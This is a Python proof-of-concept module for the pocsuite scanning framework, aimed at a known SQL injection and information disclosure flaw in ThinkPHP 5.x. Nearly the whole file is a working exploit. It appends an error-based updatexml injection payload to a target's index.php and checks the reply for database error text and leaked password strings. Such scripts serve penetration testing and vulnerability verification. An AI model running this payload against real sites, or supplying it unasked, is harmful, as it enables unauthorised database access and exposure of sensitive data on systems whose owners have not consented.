#!/usr/bin/python
# -*- coding: utf-8 -*-

import string
import time
from pocsuite.api.request import req #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr


class TestPOC(POCBase):
    name = 'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability'
    vulID = '3'  # https://www.seebug.org/vuldb/ssvid-93077
    author = ['liujun']
    vulType = 'cmd-exec'
    version = '1.0'    # default version: 1.0
    references = ['https://github.com/vulhub/vulhub/tree/master/thinkphp/in-sqlinjection']
    desc = '''ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability'''

    vulDate = '2017-07-04'
    createDate = '2019-03-23'
    updateDate = '2019-03-23'

    appName = 'Thinkphp'
    appVersion = '5.X'
    appPowerLink = 'http://www.thinkphp.cn/'
    samples = ['']


    def _attack(self):
        """attack mode"""
        return self._verify()

    def _verify(self):
        """verify mode"""
        result = {}
        self.url = self.url + "/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1"
        #print self.url
        matchstring1 = 'sqlstate'
        matchstring2 = 'password'

        resp = req.get(self.url)

        if matchstring1 in resp.content.lower() and matchstring2 in resp.content.lower():
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
